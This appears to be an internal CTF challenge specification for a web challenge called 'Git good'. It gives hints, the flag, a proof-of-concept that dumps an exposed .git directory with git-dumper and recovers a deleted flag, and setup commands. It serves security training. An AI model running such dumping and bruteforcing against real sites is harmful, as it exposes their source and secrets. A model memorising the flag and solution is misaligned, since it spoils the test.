| metadata | <> |
|--- | --- |
| Developer Name(s) | Dean |
| Best Contact Slack handle / Email address | [redacted] |
| Challenge Category | Web |
| Challenge Tier | 0 |
| Challenge Type | Container|

| Player facing | <> |
|--- | --- |
|Challenge Name | Git good |
|Challenge Description | You really have to be good to git this flag. Note: A small amount of directory bruteforcing is required for this challenge (ffuf is your friend). http://web-0 |
|Challenge Hint 1 | Common wordlists will find the thing [this might be useful](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt) |
|Challenge Hint 2 | You better git dumping that thing you found [this might be useful](https://github.com/arthaud/git-dumper)|

| Admin Facing | <> |
|--- | --- |
|Challenge Flag| WACTF{isnt_git_great} |
|Challenge Vuln| Templated web app with `.git` dir present in `/env/.git`. A basic blacklist has been set to require challenge players to configure their chosen dir-bustering tool with the requisite user-agent option. Within the git repo is a flag that has been added and removed, and has been followed by a bunch of other commits just to fill out the log. |
|Docker Usage Idle | 2% CPU / 15MB RAM |
|Docker usage Expected Peak | 20% CPU / 20MB RAM |

---

Challenge PoC

1. Run `python3 git-dumper.py http://challenge.server/env/.git/ ./some_output_dir` (script located [here](https://github.com/arthaud/git-dumper))
2. `cd some_output_dir`
3. `git checkout b97c2a177567ae7d55eb12c3b65a6b74b1198d0a`
4. `cat flag.txt`

---

## Setup Info (if recreating the git repo)

### Create git repo with faked history

Do this inside `/env`

```
git init
git config user.name wactf
git config user.email wactf@capture.tf/
npx fake-git-history --startDate "2020/09/01" --endDate "2020/09/26"
echo "<FLAG CONTENT>" > flag.txt
git add flag.txt
git commit --date 2020/09/26 -m "flag create"
git rm flag.txt
git commit --date 2020/09/27 -m "flag delete"
npx fake-git-history --startDate "2020/09/27" --endDate "2020/10/15"
```
